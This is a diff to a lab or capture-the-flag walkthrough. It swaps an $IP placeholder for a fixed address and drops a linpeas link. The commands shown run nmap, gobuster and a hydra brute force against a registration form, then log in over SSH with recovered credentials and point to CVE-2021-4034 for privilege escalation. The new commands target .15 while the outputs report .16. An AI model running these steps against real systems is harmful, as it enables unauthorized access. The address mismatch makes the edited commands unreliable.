@@ -15,7 +15,7 @@
 As a first step, all open ports are scanned.
 
 ```bash
-$ nmap -sV -Pn $IP -p-
+$ nmap -sV -Pn 192.168.10.15 -p-
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 17:55 CEST
 Nmap scan report for 192.168.10.16
 Host is up (0.0043s latency).
@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds
 The scan shows that there are two running services, a webserver and SSH. The webserver is now scanned using gobuster.
 
 ```bash
-$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt    
+$ gobuster dir -u http://192.168.10.15 -w /usr/share/wordlists/dirb/common.txt    
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -88,7 +88,7 @@ password=root&id=1
 Now to find the corresponding usernames, we bruteforce creating new users using hydra. If the username exists the registration will fail:
 
 ```bash
-$ hydra -L /usr/share/wordlists/simple-users.txt -p root $IP http-post-form
+$ hydra -L /usr/share/wordlists/simple-users.txt -p root 192.168.10.15 http-post-form
 	"/register.php:username=^USER^&password=^USER^
 	&email=^USER^%40bosym.de:Register Successful" -V
 [80][http-post-form] host: 192.168.10.16   login: admin   password: root
@@ -182,7 +182,7 @@ Now we can login via ssh with `john:root123` using `ssh john@192.168.10.16` to c
 
 ### Privilege escalation
 
-With "john" as user, run [linpeas](https://github.com/carlospolop/PEASS-ng) to search for ways to escalate privilege.
+With "john" as user, run linpeas to search for ways to escalate privilege.
 
 The logs show a possibility for CVE-2021-4034.
 
